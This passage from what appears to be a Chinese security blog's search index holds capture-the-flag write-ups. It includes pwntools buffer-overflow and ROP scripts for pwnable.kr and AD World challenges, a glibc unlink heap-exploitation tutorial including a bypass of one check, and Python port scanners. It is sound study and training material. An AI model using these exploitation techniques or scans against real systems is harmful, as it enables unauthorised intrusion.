PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.tw","slug":"PWN/Pwnable-tw","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-tw/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"horcruxes","slug":"PWN/Pwnable_kr/horcruxes","date":"2020-10-29T08:44:34.000Z","updated":"2020-10-30T01:40:42.000Z","comments":true,"path":"2020/10/29/PWN/Pwnable_kr/horcruxes/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/29/PWN/Pwnable_kr/horcruxes/","excerpt":"","text":"该程序并没有提供源代码，可以通过远程服务器下载horcruxes源文件： 1sudo scp -P 2222 horcruxes@pwnable.kr:~/horcruxes ~/PWN IDA或者GDB直观看到程序的运行逻辑： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253int ropme()&#123; char s[100]; // [esp+4h] [ebp-74h] int v2; // [esp+68h] [ebp-10h] int fd; // [esp+6Ch] [ebp-Ch] printf(&quot;Select Menu:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v2); getchar(); if ( v2 == a ) &#123; A(); &#125; else if ( v2 == b ) &#123; B(); &#125; else if ( v2 == c ) &#123; C(); &#125; else if ( v2 == d ) &#123; D(); &#125; else if ( v2 == e ) &#123; E(); &#125; else if ( v2 == f ) &#123; F(); &#125; else if ( v2 == g ) &#123; G(); &#125; else &#123; printf(&quot;How many EXP did you earned? : &quot;); gets(s); if ( atoi(s) == sum ) &#123; fd = open(&quot;flag&quot;, 0); s[read(fd, s, 0x64u)] = 0; puts(s); close(fd); exit(0); &#125; puts(&quot;You&#x27;d better get more experience to kill Voldemort&quot;); &#125; return 0;&#125; 可以明显发现可以被利用的漏洞代码gets()，该函数没有指定buffer的大小，并从stdin缓冲区读取数据，所以会导致栈中的return指针被覆盖。 检查文件保护措施 发现程序没有开启PIE也就是ASLR随机地址载入的保护机制。为buffer overflow 提供了很大的便捷。同样没有发现Canary对栈指针进行保护。但是可以明显发现该程序实现了NX栈不可执行的保护。 之后要看一下buffer的开始地址到覆盖ropme()函数return地址的距离，并进行payload的设计。 思路分析在IDA pro反汇编出的伪代码中已经标记出了sbuffer的大小和起始地址：[ebp - 0x74]基于此我们可以推断出buffer的起始地址到ropme()反回地址的距离应该为0x74 + 4。多出的这4个bytes长度是存放stack frame（原函数ebp地址）的数据长度。所以可以初步判断padding的大小为0x78 = 120个bytes数据。 通过查看源码可以发现，其实只要通过下述这个判断flag就可以得到flag： 12345678if ( atoi(s) == sum ) &#123; fd = open(&quot;flag&quot;, 0); s[read(fd, s, 0x64u)] = 0; puts(s); close(fd); exit(0); &#125; 通过这个判断我有了两个思路，第一个思路是真正的达到判定条件，得到flag，第二个思路是，在覆盖return指针后是否可以直接使得程序跳回到判断之后的语句。 第二种想法最简单，所以先尝试了这种想法。但是通过数次努力，发现ropme()函数中的地址是不可以被返回的。函数中的任意一个地址都不可以。 所以只能实行第二个思路，也是这个题目想让我们实现的方法。仔细看一下这个判断，首先通过atoi()函数将我们输入的到s的buffer里的字符串转换为int数据。然后再与sum数值进行比较，接下来就要知道sum是如何计算出来的。 123456789101112131415161718192021222324252627unsigned int init_ABCDEFG()&#123; int v0; // eax unsigned int result; // eax unsigned int buf; // [esp+8h] [ebp-10h] int fd; // [esp+Ch] [ebp-Ch] fd = open(&quot;/dev/urandom&quot;, 0); if ( read(fd, &amp;buf, 4u) != 4 ) &#123; puts(&quot;/dev/urandom error&quot;); exit(0); &#125; close(fd); srand(buf); a = -559038737 * rand() % 0xCAFEBABE; b = -559038737 * rand() % 0xCAFEBABE; c = -559038737 * rand() % 0xCAFEBABE; d = -559038737 * rand() % 0xCAFEBABE; e = -559038737 * rand() % 0xCAFEBABE; f = -559038737 * rand() % 0xCAFEBABE; v0 = rand(); g = -559038737 * v0 % 0xCAFEBABE; result = f + e + d + c + b + a + -559038737 * v0 % 0xCAFEBABE; sum = result; return result;&#125; sum = a + b + c + d + e + f + g，而这七个数值是随机生成的。此时会意识到在ropme()函数中有命名为A B C D E F G的函数，查看各个函数： 1234int A()&#123; return printf(&quot;You found \\&quot;Tom Riddle&#x27;s Diary\\&quot; (EXP +%d)\\n&quot;, a);&#125; 七个函数的作用都是与函数A()类似，打印出在init_ABCDEFG()函数中随机生成的各个数值。基于这个特点，我们构造rop payload的思路应该是，逐次返回到各个函数，然后使其打印出随机的数值。最后再返回到ropme()函数，将得到的数值相加进行输入，即可得到flag。 构造payload首先我们知道了padding数据的大小应为120 bytes。然后在120 bytes数据后可以拼接上A()函数的其实地址：0x0809fe4b。这样在ropme()函数结束后就能够跳转并执行A()函数。得到a的随机数值。但是新的问题是，如何能在运行完A()函数后执行，B()函数。其实仔细观察栈的结构就很容易发现，当函数A()执行结束之后，会执行return指令，此时return的地址应该是在我们覆盖的ropme()函数return指针的后4个bytes，也就是120 bytes + 0x0809fe4b后buffer中的数据。这样一来就很清楚了，直接将地址罗列在padding数据之后，函数会一个一个的进行跳转。最后一个问题就是，最后还要返回到ropme函数，但是，这个函数的所有地址都不能被返回。所以，可以通过返回到main函数中调用ropme()函数的地方执行ropme()。 编写python脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344#!python#coding:utf8from pwn import *# context.log_level = &#x27;debug&#x27;path_name = &#x27;horcruxes&#x27;process_name = &#x27;./&#x27;+path_nameelf = ELF(process_name)debug = 0if debug == 1: p = process(argv=[process_name], env=&#123;&#x27;LD_LIBRARY_PATH&#x27;: &#x27;./&#x27;&#125;)else: p = remote(&#x27;pwnable.kr&#x27;, 9032)def select_menu(m): p.sendlineafter(&#x27;Select Menu:&#x27;, str(m))def send_payload(payload, b): p.sendlineafter(&#x27;How many EXP did you earned? : &#x27;, payload) data = 0 if b == 1: for x in range(7): p.recvuntil(&#x27;EXP +&#x27;) recvdata = int(p.recvuntil(&#x27;)&#x27;)[:-1]) log.info(&quot;recvdata =&gt; %#d&quot;, recvdata) data += recvdata return dataselect_menu(&#x27;1&#x27;)payload = b&#x27;A&#x27;*(0x74+4) + p32(elf.symbols[&#x27;A&#x27;]) + p32(elf.symbols[&#x27;B&#x27;]) + p32(elf.symbols[&#x27;C&#x27;]) + p32(elf.symbols[&#x27;D&#x27;]) + p32(elf.symbols[&#x27;E&#x27;]) + p32(elf.symbols[&#x27;F&#x27;]) + p32(elf.symbols[&#x27;G&#x27;])payload += p32(0x809FFF9) # ropme()d = send_payload(payload, 1)select_menu(&#x27;1&#x27;)send_payload(str(d), 0)p.interactive() PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"深度学习的对抗攻击方法综述","slug":"AI安全/深度学习的对抗攻击方法综述","date":"2020-10-28T12:37:21.000Z","updated":"2020-10-28T12:49:50.000Z","comments":true,"path":"2020/10/28/AI安全/深度学习的对抗攻击方法综述/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/28/AI%E5%AE%89%E5%85%A8/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0/","excerpt":"","text":"","categories":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Machine-Learning/"},{"name":"AI安全","slug":"Machine-Learning/AI安全","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Machine-Learning/AI%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/AI/"},{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Machine-Learning/"}]},{"title":"forgot","slug":"PWN/AD_World/forgot","date":"2020-10-27T06:32:43.000Z","updated":"2020-10-27T08:04:40.000Z","comments":true,"path":"2020/10/27/PWN/AD_World/forgot/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/27/PWN/AD_World/forgot/","excerpt":"","text":"检查文件开启的保护措施 用IDA32打开 __isoc99_scanf()函数存在栈溢出漏洞，不会检查输入的字符串的长度，第二个参数表明写入地址为v2的地址，因此可以利用从v2地址开始写入内容覆盖控制函数执行流。 shift+F12查看字符串 找到其调用函数的位置 查看sub_80486CC函数所在地址（这里函数名称就对应其地址） 其函数所在地址0x080486CC，注意这里调用system函数需要传递cat flag参数，如果跳转地址直接为system函数的地址，则无法传递相应的参数。 基本思路利用栈溢出漏洞，输入v2，将v3-v12任意一个函数的地址修改为sub_80486CC的地址，之后让控制函数执行调用即可。 v2是一个32字节的char数组，v2基地址为ebp-0x74，v3基地址为0x54，相差0x74-0x54=0x20=32byte，正好是32字节的char数组的空间大小。因此，这里选择覆盖v3的地址，原因在于v3在栈中紧贴存在栈溢出漏洞的变量，对程序流程造成的未知影响的可能性最小。之后只需要保证函数结尾调用v3，则需要保证- -v14等于0，即让v14等于1。 即使得sub_8048702判断条件不成立，直接跳出循环，使得v14的值保持不变，仍为刚开始的1。查看该函数执行的逻辑。 查看其ASCII码对应的字符为： 若要使得该函数的判断条件不成立，则不能输入字符‘a’-‘z’，’0‘-’9‘，’+‘ ，’-‘，’_’ 编写python脚本12345678from pwn import *#context.log_level = &#x27;debug&#x27;io = remote(&#x27;220.249.52.133&#x27;,52435)io.sendlineafter(&#x27;&gt; &#x27;,&#x27;xiaohong&#x27;)cat_flag_addr = 0x80486CCpayload = &#x27;/&#x27;*(0x74-0x54)+ p32(cat_flag_addr)io.sendlineafter(&#x27;&gt; &#x27;,payload)io.interactive() PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"AD_World","slug":"PWN/AD-World","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/AD-World/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"},{"name":"Stack","slug":"Stack","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Stack/"}]},{"title":"unlink漏洞攻击","slug":"PWN/Heap/unlink漏洞攻击","date":"2020-10-24T11:01:21.000Z","updated":"2020-10-28T12:52:44.000Z","comments":true,"path":"2020/10/24/PWN/Heap/unlink漏洞攻击/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/24/PWN/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/","excerpt":"","text":"从一段代码开始123456789101112#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[])&#123; char *first, *second; first = malloc(666); second = malloc(12); if (argc != 1) strcpy(first, argv[1]); free(first); free(second); return 0;&#125; 上述程序在分配完堆后，堆内存分布如下图所示： 程序中 strcpy 函数会导致堆溢出，argv[1] 大于 666 字节时，可覆盖第二个 chunk 的各个字段为指定的值，从而使堆管理器将第二个 chunk 判断为空闲状态。根据 malloc 的内存回收机制，在 free(first) 时会将上图中的 second chunk 从 bin 中 unlink，并与第一个 chunk 合并。通过修改 second chunk 的 fd、bk 字段，unlink 时可把 free 函数的 GOT 表项写为 shellcode 地址。当程序再次调用 free 函数时会执行 shellcode。 什么是unlinkunlink攻击技术就是利用”glibc malloc”的内存回收机制，当堆块free时，会检查相邻的后面的堆块（地址更小的）或者前面的堆块（地址更大的）是否空闲，如果空闲，那么需要进行堆块合并操作。 空闲的堆块一般以双向链表的形式组织（fast bin是单向链表，此攻击不适用），如果刚刚释放的堆块要与前面或者后面空闲的堆块进行合并操作，那么需要将前或后的堆块从双向链表中摘下来，合并成更大的堆块插入到unsort bin链表中。空闲堆块从（small bin)双向链表中摘下来的操作就是unlink。 向后合并首先判断前一个 chunk 是否空闲，即检查当前 chunk 的 PREV_INUSE（P）位是否为 0。若为空闲，则将其合并。合并时，改变当前 chunk 指针指向前一个 chunk，使用 unlink 宏将前一个空闲 chunk 从 bin 中移除，最后更新合并后 chunk 的大小。 malloc.c 中向后合并的代码如下： 12345678910111213INTERNAL_SIZE_T hd = p-&gt;size; /* its head field */INTERNAL_SIZE_T sz; /* its size */INTERNAL_SIZE_T prevsz; /* size of previous contiguous chunk */sz = hd &amp; ~PREV_INUSE;/* consolidate backward */if (!(hd &amp; PREV_INUSE))&#123; prevsz = p-&gt;prev_size; p = chunk_at_offset(p, -(long)prevsz); sz += prevsz; unlink(p, bck, fwd);&#125;set_head(p, sz | PREV_INUSE); 本例中，释放 1st chunk 时，当前 chunk(1st chunk) 的前一个 chunk 是 allocated，所以不能向后合并，unlink 宏不会被调用。 向前合并首先判断下个 chunk 是否空闲，即检查下下个 chunk（相对当前 chunk）的 PREV_INUSE（P）位是否为 0，若为 0 表明下个 chunk 是空闲的，则进行合并。合并时使用 unlink 宏将下个 chunk 从它的 bin 中移除，并更新合并后的 chunk 大小。 malloc.c 中向前合并的代码如下： 123456789101112131415161718/* check/set/clear inuse bits in known places */#define inuse_bit_at_offset(p, s)\\ (((mchunkptr)(((char*)(p)) + (s)))-&gt;size &amp; PREV_INUSE)INTERNAL_SIZE_T hd = p-&gt;size; /* its head field */INTERNAL_SIZE_T sz; /* its size */sz = hd &amp; ~PREV_INUSE;next = chunk_at_offset(p, sz);nextsz = chunksize(next);/* consolidate forward */if (!(inuse_bit_at_offset(next, nextsz))) &#123; sz += nextsz; ... unlink(next, bck, fwd); next = chunk_at_offset(p, sz);&#125;set_head(p, sz | PREV_INUSE);next-&gt;prev_size = sz; 本例中，释放1st chunk 时，当前 chunk 的下一个 chunk（2nd chunk）是 allocated，所以不能向前合并，unlink 宏不会被调用。 unlink当前释放的堆与前一个或后一个空闲 chunk 进行合并时，会把空闲 chunk 从 bin 中移除，移除过程使用 unlink 宏来实现。unlink 宏的定义如下： 1234567/* Take a chunk off a bin list */#define unlink(P, BK, FD) &#123; \\ FD = P-&gt;fd; \\ BK = P-&gt;bk; \\ FD-&gt;bk = BK; \\ BK-&gt;fd = FD; \\&#125; unlink 即为将 P 从链表中删除的过程。 unlink攻击在 dlmalloc 中，unlink 的定义如上一节所示，只有与指针操作相关的 4 条语句。但在较新版本的 glibc 中，为了缓解攻击者进行 unlink 攻击，在宏定义中加入了安全校验，使得利用难度加大，只能在特定条件下使用一些技巧绕过校验。 原始的 unlink 攻击述例子中，传入的字符串参数长度大于 666 字节时 strcpy 会使 first chunk 溢出，可覆盖 second chunk 的头部字段为如下值： 1234prev_size = 偶数size = -4fd = free@got - 12bk = shellcode address 在执行 free(first) 时，当前释放的 frist chunk 的下下个 chunk 不是 top chunk。因为 second chunk 的大小覆盖为 -4，所以下下个 chunk 在 second chunk 偏移为 -4 的位置，因此 malloc 把 second chunk 的 prev_size 当做下下个 chunk 的 size。而 prev_size 已被覆盖为偶数（PREV_INUSE位为0），malloc 会将 second chunk 当作空闲 chunk。 释放 first chunk 时会将 second chunk 从 bin 中 unlink，并将其合并到 first chunk。这个过程会触发 unlink（second），此时 P = second chunk ptr，unlink 过程如下： 12341）FD = second chunk ptr-&gt;fd = free@got – 122）BK = second chunk ptr-&gt;bk = shellcode address3）FD-&gt;bk = BK，即 *((free@got–12)-&gt;bk) = shellcode address4）BK-&gt;fd = FD，即 *(shellcode address-&gt;fd) = free@got – 12 unlink 步骤 1）和 2）将 second chunk 的 fd 和 bk 复制到 FD 和 BK。如下图所示，复制后 FD = free@got-12，BK = shellcode address，即 second chunk 的 fd、bk 指针分别指向 free@got-12 和 shellcode address。 步骤 3）中 FD 是 malloc_chunk 结构体指针，FD-&gt;bk 相当于 FD+12 = free@got-12+12 = free@got，即 FD-&gt;bk 指向 free 的 GOT 表项，FD-&gt;bk = BK 相当于 free@got = shellcode address，即 free 的 GOT 表项被修改为了 shellcode 地址。因此，程序在执行第二个 free 时就会执行 shellcode。 同理，步骤4）中将 shellcode addr + 8 处 4 个字节覆盖为 free@got - 12，所以在编写 shellcode 时应跳过这 4 个字节。 对抗技术Double Free检测该机制不允许释放一个已经处于free状态的chunk。因此，当攻击者将second chunk的size设置为-4的时候，就意味着该size的PREV_INUSE位为0，也就是说second chunk之前的first chunk(我们需要free的chunk)已经处于free状态，那么这时候再free(first)的话，就会报出double free错误。相关代码如下： 1234567#!c/* Or whether the block is actually not marked used. */ if (__glibc_unlikely (!prev_inuse(nextchunk))) &#123; errstr = &quot;double free or corruption (!prev)&quot;; goto errout; &#125; next size非法检测该机制检测next size是否在8到当前arena的整个系统内存大小之间。因此当检测到next size为-4的时候，就会报出invalid next size错误。相关代码如下： 1234567#!cnextsize = chunksize(nextchunk);if (__builtin_expect (nextchunk-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0))&#123; errstr = &quot;free(): invalid next size (normal)&quot;; goto errout;&#125; 双链表冲突检测该机制会在执行unlink操作的时候检测链表中前一个chunk的fd与后一个chunk的bk是否都指向当前需要unlink的chunk。这样攻击者就无法替换second chunk的fd与fd了。相关代码如下： 123#!cif (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P); \\ 但记住，即使由上述三种检测方式并不意味着unlink技术都会失效，攻防是一个此消彼长的过程，例如下面介绍一种绕过安全检验的方法（注意具体情况具体分析）。 绕过安全校验首先，需要了解 glibc 中 unlink 的校验机制。以下为 glibc-2.19 中 unlink 宏的部分代码，在删除 P 节点之前会检查 FD-&gt;bk != P || BK-&gt;fd != P 是否成立，即检查当前 chunk 前一个 chunk 的 bk 与后一个 chunk 的 fd 是否指向当前 chunk。若当前 chunk 的 fd 和 bk 被修改则无法通过这项检查，FD-&gt;bk = BK 与 BK-&gt;fd = FD 不会执行，导致 unlink 攻击不能进行。 123456789101112/* Take a chunk off a bin list */#define unlink(P, BK, FD) &#123; \\ FD = P-&gt;fd; \\ BK = P-&gt;bk; \\ if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P); \\ else &#123; \\ FD-&gt;bk = BK; \\ BK-&gt;fd = FD; \\ ... &#125; \\&#125; 为了绕过以上指针校验，需要以下条件： a） 程序中存在一个全局指针变量 ptr b） ptr 指向的堆内存可由用户控制 若具备以上条件，攻击者可在指针 ptr 指向的内存中伪造一个空闲 chunk P，根据 ptr 构造合适的地址覆盖 chunk P 的 fd 和 bk，使得 FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P 成立。具体如下： 12P-&gt;fd = ptr - 0xCP-&gt;bk = ptr - 0x8 在执行 unlink（P）时的指针操作如下： 1234561）FD = P-&gt;fd = ptr - 0xC;2）BK = P-&gt;bk = ptr - 0x8;// FD-&gt;bk = ptr - 0xC + 0xC = ptr; BK-&gt;fd = ptr -0x8 + 0x8 = ptr// 由于 ptr 指向 P,可成功绕过指针校验3）FD-&gt;bk = BK，即 *ptr = ptr - 0x8;4）BK-&gt;fd = FD，即 *ptr = ptr - 0xC。 由以上过程可知，借助指向 chunk P 的 ptr 指针可绕过 “corrupted double-linked list” 安全机制，并通过 unlink 攻击实现写内存，最终使得 ptr 指向 ptr - 0xc。 unlink 后，对 ptr 指向的内存进行写入，如 ‘A’*0xC + free@got，使得 ptr 指向 free@got，再次对 ptr 指向的内存进行写入，可以把 free@got 修改为 system 的地址，之后调用 free 可任意命令执行。","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Heap","slug":"PWN/Heap","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/"},{"name":"Heap_Attack","slug":"PWN/Heap/Heap-Attack","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/Heap-Attack/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"python实现端口扫描器","slug":"Python/python实现端口扫描器","date":"2020-10-24T00:19:51.000Z","updated":"2020-10-25T01:50:40.000Z","comments":true,"path":"2020/10/24/Python/python实现端口扫描器/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/","excerpt":"","text":"实现原理最简单的端口扫描工具使用TCP连接扫描的方式，即利用操作系统原生的网络功能，且通常作为SYN扫描的替代选项。Nmap将这种模式称为连接扫描，因为使用了类似Unix系统的connect()命令。如果该端口是开放的，操作系统就能完成TCP三次握手，然后端口扫描工具会立即关闭刚建立的连接，防止拒绝服务攻击。这种端口扫描模式的优势是用户无需特殊权限。但使用操作系统原生网络功能不能实现底层控制，因此这种扫描方式并不流行。并且TCP扫描很容易被发现，尤其作为端口清扫的手段：这些服务会记录发送者的 IP 地址，入侵检测系统可能触发警报。$—&gt;$（端口扫描类型） 还有另外一种扫描方式是 SYN 扫描，端口扫描工具不使用操作系统原生网络功能，而是自行生成、发送 IP 数据包，并监控其回应。这种扫描模式被称为 “半开放扫描”，因为它从不建立完整的 TCP 连接。端口扫描工具生成一个 SYN 包，如果目标端口开放，则会返回 SYN-ACK 包。扫描端回应一个 RST 包，然后在握手完成前关闭连接。如果端口关闭了但未使用过滤，目标端口应该会持续返回 RST 包。这种粗略的网络利用方式有几个优点：给扫描工具全权控制数据包发送和等待回应时长的权力，允许更详细的回应分析。关于哪一种对目标主机的扫描方式更不具备入侵性存在一些争议，但 SYN 扫描的优势是从不会建立完整的连接。然而，RST 包可能导致网络堵塞，尤其是一些简单如打印机之类的网络设备。 实例中采用的是第一种扫描方式，直接利用操作系统的 socket 连接接口，初步测试目标服务器的端口是否可以连接，如果可以则返回端口打开状态。$—&gt;$（socket编程基础） 实现单线程扫描功能12345678910111213141516171819202122232425262728import sysfrom socket import *# 实现从程序外部向程序传递参数host = sys.argv[1]portstrs = sys.argv[2].split(&#x27;-&#x27;)# 扫描端口范围start_port = int(portstrs[0])end_port = int(portstrs[1])# 获取目标ip地址target_ip = gethostbyname(host)opened_ports = []# 进行循环连接for port in range(start_port, end_port): sock = socket(AF_INET, SOCK_STREAM) sock.settimeout(10) result = sock.connect_ex((target_ip, port)) if result == 0: opened_ports.append(port)# 打印开放的端口print(&quot;Opened ports:&quot;)for i in opened_ports: print(i) 上面代码实现了单线程扫描端口的测试，但是正常的程序在执行中我们需要考虑执行效率和提升性能，所以需要实现多线程程序。 多线程扫描123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475import timeimport socketfrom gevent import monkeymonkey.patch_all()import geventimport gevent.pooldef TCP_connect(ip, port): &quot;&quot;&quot;模拟TCP连接&quot;&quot;&quot; TCP_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) TCP_sock.settimeout(0.5) # 设置连接超时 try: result = TCP_sock.connect_ex((ip, int(port))) if result == 0: print(&quot;[*]%s 端口 开启\\t&quot; % port) else: # print(&quot;[!]%s端口 关闭&quot;%port) pass TCP_sock.close() except socket.error as e: print(&quot;[!]错误:&quot;, e)def scan_ip(): &quot;&quot;&quot;扫描目标IP&quot;&quot;&quot; ip = input(&quot;[+]输入扫描目标IP:&quot;) print(&quot;[*]正在扫描&quot;) scan_port(ip)def scan_web(): &quot;&quot;&quot;扫描目标网址&quot;&quot;&quot; web = input(&quot;[+]输入扫描网址:&quot;) if &quot;http://&quot; in web or &quot;https://&quot; in web: web = web[web.find(&#x27;://&#x27;) + 3:] print(web) print(&quot;[*]正在分析网站服务器IP&quot;) try: server_ip = socket.gethostbyname(str(web)) print(&quot;[*]服务器IP为%s&quot; % server_ip) scan_port(server_ip) except Exception as e: print(&quot;[!]服务器IP获取失败&quot;) passdef scan_port(ip): &quot;&quot;&quot;扫描端口&quot;&quot;&quot; print(&quot;[*]开始扫描目标端口&quot;) start = time.time() g = gevent.pool.Pool(50) # 设置线程数 run_list = [] for port in range(1, 65535): run_list.append(g.spawn(TCP_connect, ip, port)) gevent.joinall(run_list) end = time.time() print(&quot;[*]总耗时%s&quot; % time.strftime(&quot;%H:%M:%S&quot;, time.gmtime(end - start)))def main(): print(&quot;1.通过IP扫描端口&quot;) print(&quot;2.通过网址扫描端口&quot;) uc = int(input(&quot;[+]请输入选择:&quot;)) if 1 == uc: scan_ip() elif 2 == uc: scan_web() else: print(&quot;[!]输入有误&quot;)if __name__ == &quot;__main__&quot;: main() 这里展示部分运行结果： 选择通过网址扫描端口 选择通过IP扫描端口 使用nmap扫描12345678910import nmaphost = &#x27;192.168.56.1&#x27;# 把nmap.exe的路径放入PortScanner中，否则会有环境变量错误nm = nmap.PortScanner(nmap_search_path=(&#x27;nmap&#x27;, r&quot;E:\\nmap\\nmap.exe&quot;))for port in range(130, 136): result = nm.scan(host, str(port)) # 在主机192.168.56.1上获取端口22/tcp状态 state = result[&#x27;scan&#x27;][&#x27;192.168.56.1&#x27;][&#x27;tcp&#x27;][int(port)][&#x27;state&#x27;] print(&#x27;[%s] port state: %s&#x27; % (port, state)) 使用netstat -an查看本机开启的端口服务，用端口135测试代码运行的正确性 也可以直接使用zenmap工具进行端口扫描：","categories":[{"name":"Python","slug":"Python","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Python/"},{"name":"Web","slug":"Python/Web","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Python/Web/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Python/"},{"name":"Nmap","slug":"Nmap","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Nmap/"}]},{"title":"blukat","slug":"PWN/Pwnable_kr/blukat","date":"2020-10-22T14:01:47.000Z","updated":"2020-10-23T00:13:38.000Z","comments":true,"path":"2020/10/22/PWN/Pwnable_kr/blukat/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/22/PWN/Pwnable_kr/blukat/","excerpt":"","text":"查看blukat.c源文件123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;char flag[100];char password[100];char* key = &quot;3\\rG[S/%\\x1c\\x1d#0?\\rIS\\x0f\\x1c\\x1d\\x18;,4\\x1b\\x00\\x1bp;5\\x0b\\x1b\\x08\\x45+&quot;;void calc_flag(char* s)&#123; int i; for(i=0; i&lt;strlen(s); i++)&#123; flag[i] = s[i] ^ key[i]; &#125; printf(&quot;%s\\n&quot;, flag);&#125;int main()&#123; FILE* fp = fopen(&quot;/home/blukat/password&quot;, &quot;r&quot;); fgets(password, 100, fp); char buf[100]; printf(&quot;guess the password!\\n&quot;); fgets(buf, 128, stdin); if(!strcmp(password, buf))&#123; printf(&quot;congrats! here is your flag: &quot;); calc_flag(password); &#125; else&#123; printf(&quot;wrong guess!\\n&quot;); exit(0); &#125; return 0;&#125; 程序先读取password文件中的内容到password数组中，之后使用buf缓冲区读取用户输入的字符，buf缓冲区的大小为100，而读取的字符为128，之后比较用户输入的字符和password数组中的内容，如果相等，则可以执行cacl_flag函数，经过和密钥的异或运算计算出flag。如果采用缓冲区溢出覆盖fgets的返回地址为函数calc_flag的地址，由于不知道password的内容，无法正确计算出flag，因此这里缓冲区溢出攻击行不通。 PWN想到本题题干中的描述，本题应该是具有一种巧妙的解法（ls-la各项说明​）。 这里看到password文件的用户组含有blukat_pwn，而当前用户在blukat_pwn组，因此是具有读权限的，那运行cat命令： 提示没有访问权限？不，这里的文件内容就是这句话，那直接将这句话输入到可执行文件中即可拿到flag。","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"cmd2","slug":"PWN/Pwnable_kr/cmd2","date":"2020-10-20T06:07:54.000Z","updated":"2020-10-20T07:27:30.000Z","comments":true,"path":"2020/10/20/PWN/Pwnable_kr/cmd2/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/20/PWN/Pwnable_kr/cmd2/","excerpt":"","text":"这里登录的密码为cmd1解出的flag： 1mommy now I get what PATH environment is for :) 查看cmd2.c源代码12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;string.h&gt;int filter(char* cmd)&#123; int r=0; r += strstr(cmd, &quot;=&quot;)!=0; r += strstr(cmd, &quot;PATH&quot;)!=0; r += strstr(cmd, &quot;export&quot;)!=0; r += strstr(cmd, &quot;/&quot;)!=0; r += 